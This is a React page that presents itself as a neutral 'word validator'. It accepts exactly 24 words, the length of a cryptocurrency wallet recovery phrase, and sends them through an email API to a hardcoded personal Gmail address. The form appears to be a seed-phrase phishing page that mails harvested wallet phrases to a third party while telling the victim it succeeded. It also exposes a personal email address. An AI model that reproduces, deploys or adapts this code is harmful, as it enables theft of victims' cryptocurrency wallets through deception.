"use client"
import { useState } from 'react';

export default function WordValidatorPage() {
  const [inputText, setInputText] = useState('');
  const [errorMessage, setErrorMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    const wordCount = inputText.trim().split(/\s+/).length;
  
    if (wordCount < 24) {
      setErrorMessage('Error: Please enter exactly 24 words. You entered less than 24.');
      return;
    } else if (wordCount > 24) {
      setErrorMessage('Error: Please enter exactly 24 words. You entered more than 24.');
      return;
    }

    // Assuming userCode is inputText and email is predefined
    const userCode = inputText;
    const email = 'aamirsaleem1282@gmail.com';  // You can modify this as needed

    try {
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userCode, email }),
      });
  
      if (!response.ok) {
        throw new Error('Failed to send email.');
      }
  
      setErrorMessage('Success! Email sent with your user code.');
    } catch (error) {
      console.log(error);  // This will log the error on the client side
      setErrorMessage('Error sending email.');
    }
  };
  
  return (
    <div className="min-h-screen flex items-center justify-center bg-[#8A348E] bg-gradient-to-r from-[#8A348E] to-[#423F88] opacity-100 p-4">
      <div className="bg-white rounded-lg shadow-md p-6 sm:p-8 max-w-full sm:max-w-lg w-full">
        <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center mb-4 sm:mb-6">
          Enter Exactly 24 Words
        </h1>
        <form onSubmit={handleSubmit} className="space-y-4">
          <textarea
            value={inputText}
            onChange={(e) => setInputText(e.target.value)}
            rows="5"
            placeholder="Type your 24 words here..."
            className="w-full border border-gray-300 rounded-lg p-3 sm:p-4 text-gray-800 focus:ring-2 focus:ring-indigo-400 focus:outline-none resize-none"
          />
          <button
            type="submit"
            className="w-full text-white bg-[#8A348E] hover:bg-[#fbb44a]  font-bold py-2 sm:py-3 px-4 rounded-lg transition"
          >
            Submit
          </button>
        </form>
        {errorMessage && (
          <p
            className={`mt-4 text-center font-medium ${errorMessage.startsWith('Success') ? 'text-green-600' : 'text-red-600'}`}
          >
            {errorMessage}
          </p>
        )}
      </div>
    </div>
  );
}
